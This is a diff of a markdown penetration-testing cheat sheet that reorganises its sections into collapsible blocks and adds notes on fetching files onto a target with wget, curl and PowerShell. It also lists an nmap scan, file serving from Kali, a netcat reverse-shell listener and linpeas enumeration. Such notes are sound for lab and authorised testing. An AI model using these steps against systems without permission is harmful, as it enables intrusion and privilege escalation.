@@ -5,16 +5,20 @@
 
 ## enumeration
 
+<details><summary><input type=checkbox> port scanning</summary>
+
 ```sh
 nmap -v $host | tee 00.nmap # fast initial scan.
 
 ```
 
+</details>
+
 ## foothold and pivot
 
 ### kali
 
-> serving files
+<details> <summary><input type=checkbox> serving files</summary>
 
 ```sh
 # via webserver:
@@ -23,15 +27,28 @@ python3 -m http.server 80
 # via samba:
 impacket-smbserver -smb2server share .
 ```
-> reverse shells and port bindings
+---
+
+</details>
+
+<details><summary><input type=checkbox> reverse shells and port bindings</summary>
 
 ```sh
+# netcat
 rlwrap nc -lnvp 42424
+
+# chisel
+
+# plink
 ```
+
+</details>
+
 
 ### linux
 
-> information gathering
+<details><summary><input type=checkbox> information gathering</summary>
+
 
 ```sh
 id # user and groups.
@@ -43,20 +60,52 @@ locate / # list of probably every file on the system.
 # depending on under which user updatedb ran.
 ```
 
-> info gathering with external tools
+</details>
+
+<details><summary><input type=checkbox> downloading files</summary>
+
+
+```sh
+# linux download:
+wget $h/file
+curl $h/file -so file
+```
+
+</details>
+
+<details><summary><input type=checkbox> info gathering with external tools</summary>
+
 
 ```sh
 ./linpeas.sh -a
 ```
 
+</details>
+
 ### windows
 
-> info gathering with external tools
+<details><summary><input type=checkbox> downloading files</summary>
+
+
+```sh
+# powershell:
+Invoke-WebRequest hostname/file.exe -OutFile file.exe
+# powershell shorthand:
+iwr hostname/file.exe -outf file.exe
+
+```
+
+</details>
+
+<details><summary><input type=checkbox> info gathering with external tools</summary>
+
 
 ```sh
 linpeas.exe
 linpeas.bat # if exe fails.
 ```
+
+</details>
 
 ## priviledge escalation
 
@@ -65,6 +114,8 @@ linpeas.bat # if exe fails.
 ### windows
 
 ## oneliners
+
+<details><summary></summary>
 
 ```sh
 # upgrade shell:
@@ -86,7 +137,11 @@ cd $(mktemp -d)
 netstat -tulpen
 ```
 
+</details>
+
 # kali config
+
+<details><summary></summary>
 
 ```sh
 # pip2 for new Kalis:
@@ -113,6 +168,13 @@ gunzip chisel*
 mv chisel*windows* chisel.exe
 ```
 
+</details>
+
 # kali tips
 
+<details><summary></summary>
+
 * ranger disables previews for root (enable them on a by case basis with `zp`)
+
+</details>
+
